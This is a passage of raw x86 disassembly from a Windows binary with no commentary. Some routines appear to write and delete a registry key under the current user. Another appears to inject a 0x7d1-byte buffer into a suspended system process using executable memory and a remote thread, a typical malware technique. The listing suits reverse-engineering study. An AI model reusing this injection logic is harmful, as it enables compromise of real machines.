  4028d8:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4028db:	8b 03                	mov    (%ebx),%eax
  4028dd:	3b 75 fc             	cmp    -0x4(%ebp),%esi
  4028e0:	77 1c                	ja     0x4028fe
  4028e2:	8b 50 f8             	mov    -0x8(%eax),%edx
  4028e5:	8d 0c 3f             	lea    (%edi,%edi,1),%ecx
  4028e8:	51                   	push   %ecx
  4028e9:	89 4d 08             	mov    %ecx,0x8(%ebp)
  4028ec:	8d 0c 70             	lea    (%eax,%esi,2),%ecx
  4028ef:	51                   	push   %ecx
  4028f0:	03 d2                	add    %edx,%edx
  4028f2:	52                   	push   %edx
  4028f3:	50                   	push   %eax
  4028f4:	e8 64 0e 00 00       	call   0x40375d
  4028f9:	8b 75 08             	mov    0x8(%ebp),%esi
  4028fc:	eb 11                	jmp    0x40290f
  4028fe:	8d 34 3f             	lea    (%edi,%edi,1),%esi
  402901:	56                   	push   %esi
  402902:	51                   	push   %ecx
  402903:	8b 48 f8             	mov    -0x8(%eax),%ecx
  402906:	03 c9                	add    %ecx,%ecx
  402908:	51                   	push   %ecx
  402909:	50                   	push   %eax
  40290a:	e8 7e 07 00 00       	call   0x40308d
  40290f:	8b 03                	mov    (%ebx),%eax
  402911:	83 c4 10             	add    $0x10,%esp
  402914:	3b 78 f8             	cmp    -0x8(%eax),%edi
  402917:	0f 8f 2a ff ff ff    	jg     0x402847
  40291d:	89 78 f4             	mov    %edi,-0xc(%eax)
  402920:	8b 13                	mov    (%ebx),%edx
  402922:	33 c0                	xor    %eax,%eax
  402924:	66 89 04 16          	mov    %ax,(%esi,%edx,1)
  402928:	5e                   	pop    %esi
  402929:	8b e5                	mov    %ebp,%esp
  40292b:	5d                   	pop    %ebp
  40292c:	c2 04 00             	ret    $0x4
  40292f:	cc                   	int3
  402930:	55                   	push   %ebp
  402931:	8b ec                	mov    %esp,%ebp
  402933:	83 ec 2c             	sub    $0x2c,%esp
  402936:	56                   	push   %esi
  402937:	33 f6                	xor    %esi,%esi
  402939:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  40293c:	57                   	push   %edi
  40293d:	89 75 f8             	mov    %esi,-0x8(%ebp)
  402940:	bf 3f 00 0f 00       	mov    $0xf003f,%edi
  402945:	85 c0                	test   %eax,%eax
  402947:	74 2d                	je     0x402976
  402949:	68 10 d3 40 00       	push   $0x40d310
  40294e:	68 24 d3 40 00       	push   $0x40d324
  402953:	ff 15 58 b0 40 00    	call   *0x40b058
  402959:	50                   	push   %eax
  40295a:	ff 15 48 b0 40 00    	call   *0x40b048
  402960:	85 c0                	test   %eax,%eax
  402962:	74 08                	je     0x40296c
  402964:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  402967:	51                   	push   %ecx
  402968:	ff d0                	call   *%eax
  40296a:	eb 0a                	jmp    0x402976
  40296c:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  40296f:	52                   	push   %edx
  402970:	ff 15 5c b0 40 00    	call   *0x40b05c
  402976:	66 8b 45 d4          	mov    -0x2c(%ebp),%ax
  40297a:	66 83 f8 09          	cmp    $0x9,%ax
  40297e:	74 06                	je     0x402986
  402980:	66 83 f8 06          	cmp    $0x6,%ax
  402984:	75 05                	jne    0x40298b
  402986:	bf 3f 01 0f 00       	mov    $0xf013f,%edi
  40298b:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40298e:	50                   	push   %eax
  40298f:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  402992:	51                   	push   %ecx
  402993:	6a 00                	push   $0x0
  402995:	57                   	push   %edi
  402996:	6a 00                	push   $0x0
  402998:	6a 00                	push   $0x0
  40299a:	6a 00                	push   $0x0
  40299c:	68 58 d3 40 00       	push   $0x40d358
  4029a1:	68 01 00 00 80       	push   $0x80000001
  4029a6:	ff 15 10 b0 40 00    	call   *0x40b010
  4029ac:	85 c0                	test   %eax,%eax
  4029ae:	75 32                	jne    0x4029e2
  4029b0:	8b c3                	mov    %ebx,%eax
  4029b2:	8d 50 02             	lea    0x2(%eax),%edx
  4029b5:	66 8b 08             	mov    (%eax),%cx
  4029b8:	83 c0 02             	add    $0x2,%eax
  4029bb:	66 85 c9             	test   %cx,%cx
  4029be:	75 f5                	jne    0x4029b5
  4029c0:	2b c2                	sub    %edx,%eax
  4029c2:	d1 f8                	sar    $1,%eax
  4029c4:	8d 54 00 02          	lea    0x2(%eax,%eax,1),%edx
  4029c8:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4029cb:	52                   	push   %edx
  4029cc:	53                   	push   %ebx
  4029cd:	6a 01                	push   $0x1
  4029cf:	6a 00                	push   $0x0
  4029d1:	68 38 d3 40 00       	push   $0x40d338
  4029d6:	50                   	push   %eax
  4029d7:	ff 15 0c b0 40 00    	call   *0x40b00c
  4029dd:	be 01 00 00 00       	mov    $0x1,%esi
  4029e2:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4029e5:	51                   	push   %ecx
  4029e6:	ff 15 08 b0 40 00    	call   *0x40b008
  4029ec:	5f                   	pop    %edi
  4029ed:	8b c6                	mov    %esi,%eax
  4029ef:	5e                   	pop    %esi
  4029f0:	8b e5                	mov    %ebp,%esp
  4029f2:	5d                   	pop    %ebp
  4029f3:	c3                   	ret
  4029f4:	cc                   	int3
  4029f5:	cc                   	int3
  4029f6:	cc                   	int3
  4029f7:	cc                   	int3
  4029f8:	cc                   	int3
  4029f9:	cc                   	int3
  4029fa:	cc                   	int3
  4029fb:	cc                   	int3
  4029fc:	cc                   	int3
  4029fd:	cc                   	int3
  4029fe:	cc                   	int3
  4029ff:	cc                   	int3
  402a00:	55                   	push   %ebp
  402a01:	8b ec                	mov    %esp,%ebp
  402a03:	83 ec 2c             	sub    $0x2c,%esp
  402a06:	56                   	push   %esi
  402a07:	57                   	push   %edi
  402a08:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  402a0b:	33 ff                	xor    %edi,%edi
  402a0d:	c7 45 f8 02 00 00 00 	movl   $0x2,-0x8(%ebp)
  402a14:	be 3f 00 0f 00       	mov    $0xf003f,%esi
  402a19:	85 c0                	test   %eax,%eax
  402a1b:	74 2d                	je     0x402a4a
  402a1d:	68 10 d3 40 00       	push   $0x40d310
  402a22:	68 24 d3 40 00       	push   $0x40d324
  402a27:	ff 15 58 b0 40 00    	call   *0x40b058
  402a2d:	50                   	push   %eax
  402a2e:	ff 15 48 b0 40 00    	call   *0x40b048
  402a34:	85 c0                	test   %eax,%eax
  402a36:	74 08                	je     0x402a40
  402a38:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  402a3b:	51                   	push   %ecx
  402a3c:	ff d0                	call   *%eax
  402a3e:	eb 0a                	jmp    0x402a4a
  402a40:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  402a43:	52                   	push   %edx
  402a44:	ff 15 5c b0 40 00    	call   *0x40b05c
  402a4a:	66 8b 45 d4          	mov    -0x2c(%ebp),%ax
  402a4e:	66 83 f8 09          	cmp    $0x9,%ax
  402a52:	74 06                	je     0x402a5a
  402a54:	66 83 f8 06          	cmp    $0x6,%ax
  402a58:	75 05                	jne    0x402a5f
  402a5a:	be 3f 01 0f 00       	mov    $0xf013f,%esi
  402a5f:	8d 45 f8             	lea    -0x8(%ebp),%eax
  402a62:	50                   	push   %eax
  402a63:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  402a66:	51                   	push   %ecx
  402a67:	6a 00                	push   $0x0
  402a69:	56                   	push   %esi
  402a6a:	6a 00                	push   $0x0
  402a6c:	6a 00                	push   $0x0
  402a6e:	6a 00                	push   $0x0
  402a70:	68 58 d3 40 00       	push   $0x40d358
  402a75:	68 01 00 00 80       	push   $0x80000001
  402a7a:	ff 15 10 b0 40 00    	call   *0x40b010
  402a80:	85 c0                	test   %eax,%eax
  402a82:	75 27                	jne    0x402aab
  402a84:	8b 55 fc             	mov    -0x4(%ebp),%edx
  402a87:	68 38 d3 40 00       	push   $0x40d338
  402a8c:	52                   	push   %edx
  402a8d:	ff 15 04 b0 40 00    	call   *0x40b004
  402a93:	6a 00                	push   $0x0
  402a95:	56                   	push   %esi
  402a96:	68 58 d3 40 00       	push   $0x40d358
  402a9b:	68 01 00 00 80       	push   $0x80000001
  402aa0:	ff 15 00 b0 40 00    	call   *0x40b000
  402aa6:	bf 01 00 00 00       	mov    $0x1,%edi
  402aab:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402aae:	50                   	push   %eax
  402aaf:	ff 15 08 b0 40 00    	call   *0x40b008
  402ab5:	8b c7                	mov    %edi,%eax
  402ab7:	5f                   	pop    %edi
  402ab8:	5e                   	pop    %esi
  402ab9:	8b e5                	mov    %ebp,%esp
  402abb:	5d                   	pop    %ebp
  402abc:	c3                   	ret
  402abd:	cc                   	int3
  402abe:	cc                   	int3
  402abf:	cc                   	int3
  402ac0:	55                   	push   %ebp
  402ac1:	8b ec                	mov    %esp,%ebp
  402ac3:	81 ec 70 02 00 00    	sub    $0x270,%esp
  402ac9:	a1 b0 f0 40 00       	mov    0x40f0b0,%eax
  402ace:	33 c5                	xor    %ebp,%eax
  402ad0:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402ad3:	53                   	push   %ebx
  402ad4:	56                   	push   %esi
  402ad5:	6a 00                	push   $0x0
  402ad7:	8b d9                	mov    %ecx,%ebx
  402ad9:	ff 15 58 b0 40 00    	call   *0x40b058
  402adf:	33 c0                	xor    %eax,%eax
  402ae1:	68 06 02 00 00       	push   $0x206
  402ae6:	50                   	push   %eax
  402ae7:	8d 8d f2 fd ff ff    	lea    -0x20e(%ebp),%ecx
  402aed:	51                   	push   %ecx
  402aee:	66 89 85 f0 fd ff ff 	mov    %ax,-0x210(%ebp)
  402af5:	e8 f6 10 00 00       	call   0x403bf0
  402afa:	83 c4 0c             	add    $0xc,%esp
  402afd:	e8 2e fe ff ff       	call   0x402930
  402b02:	68 04 01 00 00       	push   $0x104
  402b07:	8d 95 f0 fd ff ff    	lea    -0x210(%ebp),%edx
  402b0d:	52                   	push   %edx
  402b0e:	ff 15 60 b0 40 00    	call   *0x40b060
  402b14:	8d 85 f0 fd ff ff    	lea    -0x210(%ebp),%eax
  402b1a:	83 c0 fe             	add    $0xfffffffe,%eax
  402b1d:	8d 49 00             	lea    0x0(%ecx),%ecx
  402b20:	66 8b 48 02          	mov    0x2(%eax),%cx
  402b24:	83 c0 02             	add    $0x2,%eax
  402b27:	66 85 c9             	test   %cx,%cx
  402b2a:	75 f4                	jne    0x402b20
  402b2c:	8b 0d 10 d4 40 00    	mov    0x40d410,%ecx
  402b32:	8b 15 14 d4 40 00    	mov    0x40d414,%edx
  402b38:	89 08                	mov    %ecx,(%eax)
  402b3a:	8b 0d 18 d4 40 00    	mov    0x40d418,%ecx
  402b40:	89 50 04             	mov    %edx,0x4(%eax)
  402b43:	8b 15 1c d4 40 00    	mov    0x40d41c,%edx
  402b49:	89 48 08             	mov    %ecx,0x8(%eax)
  402b4c:	8b 0d 20 d4 40 00    	mov    0x40d420,%ecx
  402b52:	89 50 0c             	mov    %edx,0xc(%eax)
  402b55:	6a 44                	push   $0x44
  402b57:	8d 95 90 fd ff ff    	lea    -0x270(%ebp),%edx
  402b5d:	6a 00                	push   $0x0
  402b5f:	52                   	push   %edx
  402b60:	89 48 10             	mov    %ecx,0x10(%eax)
  402b63:	e8 88 10 00 00       	call   0x403bf0
  402b68:	83 c4 0c             	add    $0xc,%esp
  402b6b:	33 c0                	xor    %eax,%eax
  402b6d:	89 85 e0 fd ff ff    	mov    %eax,-0x220(%ebp)
  402b73:	89 85 e4 fd ff ff    	mov    %eax,-0x21c(%ebp)
  402b79:	89 85 e8 fd ff ff    	mov    %eax,-0x218(%ebp)
  402b7f:	89 85 ec fd ff ff    	mov    %eax,-0x214(%ebp)
  402b85:	8d 85 e0 fd ff ff    	lea    -0x220(%ebp),%eax
  402b8b:	50                   	push   %eax
  402b8c:	8d 8d 90 fd ff ff    	lea    -0x270(%ebp),%ecx
  402b92:	51                   	push   %ecx
  402b93:	6a 00                	push   $0x0
  402b95:	6a 00                	push   $0x0
  402b97:	6a 04                	push   $0x4
  402b99:	6a 00                	push   $0x0
  402b9b:	6a 00                	push   $0x0
  402b9d:	6a 00                	push   $0x0
  402b9f:	6a 00                	push   $0x0
  402ba1:	8d 95 f0 fd ff ff    	lea    -0x210(%ebp),%edx
  402ba7:	52                   	push   %edx
  402ba8:	c7 85 90 fd ff ff 44 	movl   $0x44,-0x270(%ebp)
  402baf:	00 00 00 
  402bb2:	ff 15 64 b0 40 00    	call   *0x40b064
  402bb8:	85 c0                	test   %eax,%eax
  402bba:	0f 84 8a 00 00 00    	je     0x402c4a
  402bc0:	8b 85 e0 fd ff ff    	mov    -0x220(%ebp),%eax
  402bc6:	6a 40                	push   $0x40
  402bc8:	68 00 30 00 00       	push   $0x3000
  402bcd:	68 d1 07 00 00       	push   $0x7d1
  402bd2:	6a 00                	push   $0x0
  402bd4:	50                   	push   %eax
  402bd5:	ff 15 68 b0 40 00    	call   *0x40b068
  402bdb:	8b f0                	mov    %eax,%esi
  402bdd:	85 f6                	test   %esi,%esi
  402bdf:	74 69                	je     0x402c4a
  402be1:	8b 8d e0 fd ff ff    	mov    -0x220(%ebp),%ecx
  402be7:	6a 00                	push   $0x0
  402be9:	68 d1 07 00 00       	push   $0x7d1
  402bee:	68 c8 ff 40 00       	push   $0x40ffc8
  402bf3:	56                   	push   %esi
  402bf4:	51                   	push   %ecx
  402bf5:	ff 15 e0 b0 40 00    	call   *0x40b0e0
  402bfb:	8b 95 e0 fd ff ff    	mov    -0x220(%ebp),%edx
  402c01:	6a 00                	push   $0x0
  402c03:	6a 00                	push   $0x0
  402c05:	6a 00                	push   $0x0
  402c07:	56                   	push   %esi
  402c08:	6a 00                	push   $0x0
  402c0a:	6a 00                	push   $0x0
  402c0c:	52                   	push   %edx
  402c0d:	ff 15 70 b0 40 00    	call   *0x40b070
  402c13:	8b 85 e4 fd ff ff    	mov    -0x21c(%ebp),%eax
  402c19:	6a ff                	push   $0xffffffff
  402c1b:	50                   	push   %eax
  402c1c:	ff 15 74 b0 40 00    	call   *0x40b074
  402c22:	8b 95 e0 fd ff ff    	mov    -0x220(%ebp),%edx
  402c28:	8d 8d dc fd ff ff    	lea    -0x224(%ebp),%ecx
  402c2e:	51                   	push   %ecx
  402c2f:	52                   	push   %edx
  402c30:	ff 15 78 b0 40 00    	call   *0x40b078
  402c36:	8b 85 e0 fd ff ff    	mov    -0x220(%ebp),%eax
  402c3c:	6a 00                	push   $0x0
  402c3e:	50                   	push   %eax
  402c3f:	ff 15 7c b0 40 00    	call   *0x40b07c
  402c45:	e8 b6 fd ff ff       	call   0x402a00
  402c4a:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  402c4d:	5e                   	pop    %esi
  402c4e:	33 cd                	xor    %ebp,%ecx
  402c50:	33 c0                	xor    %eax,%eax
  402c52:	5b                   	pop    %ebx
  402c53:	e8 26 04 00 00       	call   0x40307e
  402c58:	8b e5                	mov    %ebp,%esp
  402c5a:	5d                   	pop    %ebp
  402c5b:	c3                   	ret
  402c5c:	8b ff                	mov    %edi,%edi
  402c5e:	55                   	push   %ebp
  402c5f:	8b ec                	mov    %esp,%ebp
  402c61:	5d                   	pop    %ebp
  402c62:	e9 3a 0a 00 00       	jmp    0x4036a1
  402c67:	e9 cb 05 00 00       	jmp    0x403237
  402c6c:	8b ff                	mov    %edi,%edi
  402c6e:	55                   	push   %ebp
  402c6f:	8b ec                	mov    %esp,%ebp
  402c71:	56                   	push   %esi
  402c72:	ff 75 08             	push   0x8(%ebp)
  402c75:	8b f1                	mov    %ecx,%esi
  402c77:	e8 ed 05 00 00       	call   0x403269
  402c7c:	c7 06 00 b2 40 00    	movl   $0x40b200,(%esi)
  402c82:	8b c6                	mov    %esi,%eax
  402c84:	5e                   	pop    %esi
  402c85:	5d                   	pop    %ebp
  402c86:	c2 04 00             	ret    $0x4
  402c89:	8b ff                	mov    %edi,%edi
  402c8b:	55                   	push   %ebp
  402c8c:	8b ec                	mov    %esp,%ebp
  402c8e:	83 ec 0c             	sub    $0xc,%esp
  402c91:	8b 45 08             	mov    0x8(%ebp),%eax
  402c94:	89 45 08             	mov    %eax,0x8(%ebp)
  402c97:	8d 45 08             	lea    0x8(%ebp),%eax
  402c9a:	50                   	push   %eax
  402c9b:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  402c9e:	e8 38 05 00 00       	call   0x4031db
  402ca3:	68 4c d7 40 00       	push   $0x40d74c
  402ca8:	8d 45 f4             	lea    -0xc(%ebp),%eax
  402cab:	50                   	push   %eax
  402cac:	c7 45 f4 0c b2 40 00 	movl   $0x40b20c,-0xc(%ebp)
  402cb3:	e8 a7 0e 00 00       	call   0x403b5f
  402cb8:	cc                   	int3
  402cb9:	8b ff                	mov    %edi,%edi
  402cbb:	55                   	push   %ebp
  402cbc:	8b ec                	mov    %esp,%ebp
  402cbe:	56                   	push   %esi
  402cbf:	ff 75 08             	push   0x8(%ebp)
  402cc2:	8b f1                	mov    %ecx,%esi
  402cc4:	e8 a0 05 00 00       	call   0x403269
  402cc9:	c7 06 0c b2 40 00    	movl   $0x40b20c,(%esi)
  402ccf:	8b c6                	mov    %esi,%eax
  402cd1:	5e                   	pop    %esi
  402cd2:	5d                   	pop    %ebp
  402cd3:	c2 04 00             	ret    $0x4
  402cd6:	8b ff                	mov    %edi,%edi
  402cd8:	55                   	push   %ebp
  402cd9:	8b ec                	mov    %esp,%ebp
  402cdb:	83 ec 0c             	sub    $0xc,%esp
  402cde:	8b 45 08             	mov    0x8(%ebp),%eax
  402ce1:	89 45 08             	mov    %eax,0x8(%ebp)
  402ce4:	8d 45 08             	lea    0x8(%ebp),%eax
  402ce7:	50                   	push   %eax
  402ce8:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  402ceb:	e8 eb 04 00 00       	call   0x4031db
  402cf0:	68 88 d7 40 00       	push   $0x40d788
  402cf5:	8d 45 f4             	lea    -0xc(%ebp),%eax
  402cf8:	50                   	push   %eax
  402cf9:	c7 45 f4 18 b2 40 00 	movl   $0x40b218,-0xc(%ebp)
  402d00:	e8 5a 0e 00 00       	call   0x403b5f
  402d05:	cc                   	int3
  402d06:	8b ff                	mov    %edi,%edi
  402d08:	55                   	push   %ebp
  402d09:	8b ec                	mov    %esp,%ebp
  402d0b:	56                   	push   %esi
  402d0c:	ff 75 08             	push   0x8(%ebp)
  402d0f:	8b f1                	mov    %ecx,%esi
  402d11:	e8 53 05 00 00       	call   0x403269
  402d16:	c7 06 18 b2 40 00    	movl   $0x40b218,(%esi)
  402d1c:	8b c6                	mov    %esi,%eax
  402d1e:	5e                   	pop    %esi
  402d1f:	5d                   	pop    %ebp
  402d20:	c2 04 00             	ret    $0x4
  402d23:	8b ff                	mov    %edi,%edi
  402d25:	55                   	push   %ebp
  402d26:	8b ec                	mov    %esp,%ebp
  402d28:	56                   	push   %esi
  402d29:	8b f1                	mov    %ecx,%esi
  402d2b:	e8 07 05 00 00       	call   0x403237
  402d30:	f6 45 08 01          	testb  $0x1,0x8(%ebp)
  402d34:	74 07                	je     0x402d3d
  402d36:	56                   	push   %esi
  402d37:	e8 37 03 00 00       	call   0x403073
  402d3c:	59                   	pop    %ecx
  402d3d:	8b c6                	mov    %esi,%eax
  402d3f:	5e                   	pop    %esi
  402d40:	5d                   	pop    %ebp
  402d41:	c2 04 00             	ret    $0x4
  402d44:	8b ff                	mov    %edi,%edi
  402d46:	56                   	push   %esi
  402d47:	8b f1                	mov    %ecx,%esi
  402d49:	8b 06                	mov    (%esi),%eax
  402d4b:	85 c0                	test   %eax,%eax
  402d4d:	74 0a                	je     0x402d59
  402d4f:	50                   	push   %eax
  402d50:	e8 56 0e 00 00       	call   0x403bab
  402d55:	83 26 00             	andl   $0x0,(%esi)
  402d58:	59                   	pop    %ecx
  402d59:	83 66 04 00          	andl   $0x0,0x4(%esi)
  402d5d:	83 66 08 00          	andl   $0x0,0x8(%esi)
  402d61:	5e                   	pop    %esi
  402d62:	c3                   	ret
  402d63:	8b ff                	mov    %edi,%edi
  402d65:	56                   	push   %esi
  402d66:	33 f6                	xor    %esi,%esi
  402d68:	56                   	push   %esi
  402d69:	51                   	push   %ecx
  402d6a:	ff 15 90 b0 40 00    	call   *0x40b090
  402d70:	85 c0                	test   %eax,%eax
  402d72:	75 16                	jne    0x402d8a
  402d74:	ff 15 8c b0 40 00    	call   *0x40b08c
  402d7a:	3b c6                	cmp    %esi,%eax
  402d7c:	7e 0a                	jle    0x402d88
  402d7e:	25 ff ff 00 00       	and    $0xffff,%eax
  402d83:	0d 00 00 07 80       	or     $0x80070000,%eax
  402d88:	8b f0                	mov    %eax,%esi
  402d8a:	8b c6                	mov    %esi,%eax
  402d8c:	5e                   	pop    %esi
  402d8d:	c3                   	ret
  402d8e:	8b ff                	mov    %edi,%edi
  402d90:	56                   	push   %esi
  402d91:	8b f1                	mov    %ecx,%esi
  402d93:	6a 18                	push   $0x18
  402d95:	8d 46 14             	lea    0x14(%esi),%eax
  402d98:	6a 00                	push   $0x0
  402d9a:	50                   	push   %eax
  402d9b:	e8 50 0e 00 00       	call   0x403bf0
  402da0:	83 66 2c 00          	andl   $0x0,0x2c(%esi)
  402da4:	83 66 30 00          	andl   $0x0,0x30(%esi)
  402da8:	83 66 34 00          	andl   $0x0,0x34(%esi)
  402dac:	83 c4 0c             	add    $0xc,%esp
  402daf:	8b c6                	mov    %esi,%eax
  402db1:	5e                   	pop    %esi
  402db2:	c3                   	ret
  402db3:	8b ff                	mov    %edi,%edi
  402db5:	56                   	push   %esi
  402db6:	8b f1                	mov    %ecx,%esi
  402db8:	8d 46 14             	lea    0x14(%esi),%eax
  402dbb:	50                   	push   %eax
  402dbc:	ff 15 94 b0 40 00    	call   *0x40b094
  402dc2:	8d 4e 2c             	lea    0x2c(%esi),%ecx
  402dc5:	5e                   	pop    %esi
  402dc6:	e9 79 ff ff ff       	jmp    0x402d44
  402dcb:	8b ff                	mov    %edi,%edi
  402dcd:	55                   	push   %ebp
  402dce:	8b ec                	mov    %esp,%ebp
  402dd0:	56                   	push   %esi
  402dd1:	57                   	push   %edi
  402dd2:	8b f1                	mov    %ecx,%esi
  402dd4:	8d 7e 14             	lea    0x14(%esi),%edi
  402dd7:	57                   	push   %edi
  402dd8:	ff 15 84 b0 40 00    	call   *0x40b084
  402dde:	8b 4e 30             	mov    0x30(%esi),%ecx
  402de1:	8b 45 08             	mov    0x8(%ebp),%eax
  402de4:	3b c1                	cmp    %ecx,%eax
  402de6:	7f 31                	jg     0x402e19
  402de8:	85 c0                	test   %eax,%eax
  402dea:	78 2d                	js     0x402e19
  402dec:	3b c1                	cmp    %ecx,%eax
  402dee:	75 0e                	jne    0x402dfe
  402df0:	8b 76 08             	mov    0x8(%esi),%esi
  402df3:	57                   	push   %edi
  402df4:	ff 15 88 b0 40 00    	call   *0x40b088
  402dfa:	8b c6                	mov    %esi,%eax
  402dfc:	eb 24                	jmp    0x402e22
  402dfe:	7d 08                	jge    0x402e08
  402e00:	8b 4e 2c             	mov    0x2c(%esi),%ecx
  402e03:	8b 34 81             	mov    (%ecx,%eax,4),%esi
  402e06:	eb eb                	jmp    0x402df3
  402e08:	6a 00                	push   $0x0
  402e0a:	6a 00                	push   $0x0
  402e0c:	6a 01                	push   $0x1
  402e0e:	68 8c 00 00 c0       	push   $0xc000008c
  402e13:	ff 15 80 b0 40 00    	call   *0x40b080
  402e19:	57                   	push   %edi
  402e1a:	ff 15 88 b0 40 00    	call   *0x40b088
  402e20:	33 c0                	xor    %eax,%eax
  402e22:	5f                   	pop    %edi
  402e23:	5e                   	pop    %esi
  402e24:	5d                   	pop    %ebp
  402e25:	c2 04 00             	ret    $0x4
  402e28:	8b ff                	mov    %edi,%edi
  402e2a:	56                   	push   %esi
  402e2b:	8b f1                	mov    %ecx,%esi
  402e2d:	e8 5c ff ff ff       	call   0x402d8e
  402e32:	b8 00 00 40 00       	mov    $0x400000,%eax
  402e37:	8d 4e 14             	lea    0x14(%esi),%ecx
  402e3a:	c7 06 38 00 00 00    	movl   $0x38,(%esi)
  402e40:	89 46 08             	mov    %eax,0x8(%esi)
  402e43:	89 46 04             	mov    %eax,0x4(%esi)
  402e46:	c7 46 0c 00 0a 00 00 	movl   $0xa00,0xc(%esi)
  402e4d:	c7 46 10 40 b2 40 00 	movl   $0x40b240,0x10(%esi)
  402e54:	e8 0a ff ff ff       	call   0x402d63
  402e59:	85 c0                	test   %eax,%eax
  402e5b:	79 07                	jns    0x402e64
  402e5d:	c6 05 f8 15 41 00 01 	movb   $0x1,0x4115f8
  402e64:	8b c6                	mov    %esi,%eax
  402e66:	5e                   	pop    %esi
  402e67:	c3                   	ret
  402e68:	80 79 08 00          	cmpb   $0x0,0x8(%ecx)
  402e6c:	c7 01 50 b2 40 00    	movl   $0x40b250,(%ecx)
  402e72:	74 0e                	je     0x402e82
  402e74:	8b 49 04             	mov    0x4(%ecx),%ecx
  402e77:	85 c9                	test   %ecx,%ecx
  402e79:	74 07                	je     0x402e82
  402e7b:	51                   	push   %ecx
  402e7c:	ff 15 98 b0 40 00    	call   *0x40b098
  402e82:	c3                   	ret
  402e83:	8b ff                	mov    %edi,%edi
  402e85:	55                   	push   %ebp
  402e86:	8b ec                	mov    %esp,%ebp
  402e88:	ff 75 08             	push   0x8(%ebp)
  402e8b:	6a 00                	push   $0x0
  402e8d:	ff 71 04             	push   0x4(%ecx)
  402e90:	ff 15 9c b0 40 00    	call   *0x40b09c
  402e96:	5d                   	pop    %ebp
  402e97:	c2 04 00             	ret    $0x4
  402e9a:	8b ff                	mov    %edi,%edi
  402e9c:	55                   	push   %ebp
  402e9d:	8b ec                	mov    %esp,%ebp
  402e9f:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  402ea3:	74 0e                	je     0x402eb3
  402ea5:	ff 75 08             	push   0x8(%ebp)
  402ea8:	6a 00                	push   $0x0
  402eaa:	ff 71 04             	push   0x4(%ecx)
  402ead:	ff 15 a0 b0 40 00    	call   *0x40b0a0
  402eb3:	5d                   	pop    %ebp
  402eb4:	c2 04 00             	ret    $0x4
  402eb7:	8b ff                	mov    %edi,%edi
  402eb9:	55                   	push   %ebp
  402eba:	8b ec                	mov    %esp,%ebp
  402ebc:	33 c0                	xor    %eax,%eax
  402ebe:	39 45 08             	cmp    %eax,0x8(%ebp)
  402ec1:	75 09                	jne    0x402ecc
  402ec3:	ff 75 0c             	push   0xc(%ebp)
  402ec6:	8b 01                	mov    (%ecx),%eax
  402ec8:	ff 10                	call   *(%eax)
  402eca:	eb 21                	jmp    0x402eed
  402ecc:	39 45 0c             	cmp    %eax,0xc(%ebp)
  402ecf:	75 0c                	jne    0x402edd
  402ed1:	ff 75 08             	push   0x8(%ebp)
  402ed4:	8b 01                	mov    (%ecx),%eax
  402ed6:	ff 50 04             	call   *0x4(%eax)
  402ed9:	33 c0                	xor    %eax,%eax
  402edb:	eb 10                	jmp    0x402eed
  402edd:	ff 75 0c             	push   0xc(%ebp)
  402ee0:	ff 75 08             	push   0x8(%ebp)
  402ee3:	50                   	push   %eax
  402ee4:	ff 71 04             	push   0x4(%ecx)
  402ee7:	ff 15 a4 b0 40 00    	call   *0x40b0a4
  402eed:	5d                   	pop    %ebp
  402eee:	c2 08 00             	ret    $0x8
  402ef1:	8b ff                	mov    %edi,%edi
  402ef3:	55                   	push   %ebp
  402ef4:	8b ec                	mov    %esp,%ebp
  402ef6:	ff 75 08             	push   0x8(%ebp)
  402ef9:	6a 00                	push   $0x0
  402efb:	ff 71 04             	push   0x4(%ecx)
  402efe:	ff 15 a8 b0 40 00    	call   *0x40b0a8
  402f04:	5d                   	pop    %ebp
  402f05:	c2 04 00             	ret    $0x4
  402f08:	8b ff                	mov    %edi,%edi
  402f0a:	55                   	push   %ebp
  402f0b:	8b ec                	mov    %esp,%ebp
  402f0d:	56                   	push   %esi
  402f0e:	8b f1                	mov    %ecx,%esi
  402f10:	e8 53 ff ff ff       	call   0x402e68
  402f15:	f6 45 08 01          	testb  $0x1,0x8(%ebp)
  402f19:	74 07                	je     0x402f22
  402f1b:	56                   	push   %esi
  402f1c:	e8 52 01 00 00       	call   0x403073
  402f21:	59                   	pop    %ecx
  402f22:	8b c6                	mov    %esi,%eax
  402f24:	5e                   	pop    %esi
  402f25:	5d                   	pop    %ebp
  402f26:	c2 04 00             	ret    $0x4
  402f29:	8b ff                	mov    %edi,%edi
  402f2b:	55                   	push   %ebp
  402f2c:	8b ec                	mov    %esp,%ebp
  402f2e:	8b 45 0c             	mov    0xc(%ebp),%eax
  402f31:	f7 65 10             	mull   0x10(%ebp)
  402f34:	85 d2                	test   %edx,%edx
  402f36:	75 05                	jne    0x402f3d
  402f38:	83 f8 ff             	cmp    $0xffffffff,%eax
  402f3b:	76 07                	jbe    0x402f44
  402f3d:	b8 16 02 07 80       	mov    $0x80070216,%eax
  402f42:	5d                   	pop    %ebp
  402f43:	c3                   	ret
  402f44:	8b 4d 08             	mov    0x8(%ebp),%ecx
  402f47:	89 01                	mov    %eax,(%ecx)
  402f49:	33 c0                	xor    %eax,%eax
  402f4b:	5d                   	pop    %ebp
  402f4c:	c3                   	ret
  402f4d:	8b ff                	mov    %edi,%edi
  402f4f:	55                   	push   %ebp
  402f50:	8b ec                	mov    %esp,%ebp
  402f52:	8b 49 04             	mov    0x4(%ecx),%ecx
  402f55:	8b 01                	mov    (%ecx),%eax
  402f57:	5d                   	pop    %ebp
  402f58:	ff 60 04             	jmp    *0x4(%eax)
  402f5b:	33 d2                	xor    %edx,%edx
  402f5d:	8d 41 14             	lea    0x14(%ecx),%eax
  402f60:	42                   	inc    %edx
